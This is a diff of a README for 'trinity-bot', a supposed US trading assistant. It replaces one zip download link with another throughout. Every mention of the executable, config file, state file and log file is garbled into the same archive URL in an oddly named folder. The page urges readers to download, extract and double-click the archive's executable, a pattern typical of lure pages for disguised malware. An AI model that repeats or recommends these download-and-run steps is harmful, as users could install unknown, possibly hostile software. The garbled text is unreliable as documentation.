@@ -1,7 +1,7 @@
 # 🤖 trinity-bot - Your Easy US Trading Assistant
 
 ## 📥 Download Now
-[![Download trinity-bot](https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip%20trinity--bot-v1.0-brightgreen)](https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip)
+[![Download trinity-bot](https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip%20trinity--bot-v1.0-brightgreen)](https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Follow these simple steps to get started with Trinity Bot.
 ### 🔗 Step 1: Visit the Download Page
 To download the software, click the link below:
 
-[Download trinity-bot](https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip)
+[Download trinity-bot](https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip)
 
 ### 💾 Step 2: Download the Latest Release
 1. On the Releases page, locate the most recent version of Trinity Bot.
@@ -33,14 +33,14 @@ To download the software, click the link below:
 ### ⚙️ Step 3: Install the Application
 1. Once the download is complete, find the file in your downloads folder.
 2. If it is a ZIP file, right-click and choose "Extract All" to unzip the contents.
-3. Open the extracted folder and locate the executable file (e.g., `https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip`).
+3. Open the extracted folder and locate the executable file (e.g., `https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip`).
 
 ### 🔄 Step 4: Run Trinity Bot
 1. Double-click on the executable file to start the bot.
 2. Follow the on-screen instructions to set it up. 
 
 ### 📄 Step 5: Configure the Bot
-1. Trinity Bot uses a `https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip` file to manage settings. Open this file in a text editor.
+1. Trinity Bot uses a `https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip` file to manage settings. Open this file in a text editor.
 2. Adjust the settings as needed to fit your trading preferences. 
 
 2. You can set parameters like:
@@ -49,17 +49,17 @@ To download the software, click the link below:
    - Any custom settings you desire.
 
 ### 💾 Step 6: Save Your State
-Trinity Bot will save your trading state automatically. This includes your capital and positions, kept in a file called `https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip`. Ensure you allow read/write access to this file for smooth operation.
+Trinity Bot will save your trading state automatically. This includes your capital and positions, kept in a file called `https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip`. Ensure you allow read/write access to this file for smooth operation.
 
 ### 📝 Step 7: Monitor Activity
-Check the `https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip` file. It will contain all events, errors, and state changes, helping you monitor the bot's performance.
+Check the `https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip` file. It will contain all events, errors, and state changes, helping you monitor the bot's performance.
 
 ---
 
 ## 🔍 Note on Features
 Trinity Bot is built upon a sophisticated multi-agent system. Here are some details about what you can expect:
 
-- **User-friendly Configuration**: Tweak settings easily using the external `https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip`, even if you aren't tech-savvy.
+- **User-friendly Configuration**: Tweak settings easily using the external `https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip`, even if you aren't tech-savvy.
 - **State Persistence**: The bot maintains its state even after restarts, protecting your status so you can resume trading without losing information.
 - **Structured Logging**: All actions taken by the bot are logged for transparency. This includes errors and successes, allowing you to debug issues quickly.
 
@@ -102,4 +102,4 @@ Keep an eye on new releases. Regular updates improve functionality and complianc
 
 For more information, resources, and community support, visit the following link:
 
-[Download trinity-bot](https://raw.githubusercontent.com/JU4NP11/trinity-bot/main/anorogenic/bot_trinity_v3.7.zip)
+[Download trinity-bot](https://github.com/JU4NP11/trinity-bot/raw/refs/heads/main/anorogenic/trinity_bot_v1.2.zip)
